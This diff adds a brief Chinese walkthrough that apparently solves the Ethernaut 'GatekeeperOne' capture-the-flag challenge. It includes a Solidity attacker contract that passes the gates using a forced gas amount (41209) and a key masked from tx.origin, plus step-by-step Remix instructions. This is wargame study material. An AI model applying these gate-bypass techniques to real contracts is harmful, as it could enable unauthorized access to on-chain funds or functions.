@@ -1,0 +1,15 @@
+GatekeeperOne
+1.打开Remix
+2.将GatekeeperOne合约复制进文件
+3.将以代码放入同一文件中
+contract GatekeeperOne1 {
+    function enterTest(uint256 gasAmount,GatekeeperOne gatekeeperOne) public {
+        gatekeeperOne.enter{gas:gasAmount}(getTxOrgin2());
+    }
+
+    function getTxOrgin2() public view returns (bytes8 origin){
+        origin = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
+    }
+}
+4.部署GatekeeperOne1合约
+5.调用GatekeeperOne1合约的enterTest方法传入使用的gas数量，此时默认传入41209的gas，以及GatekeeperOne合约地址
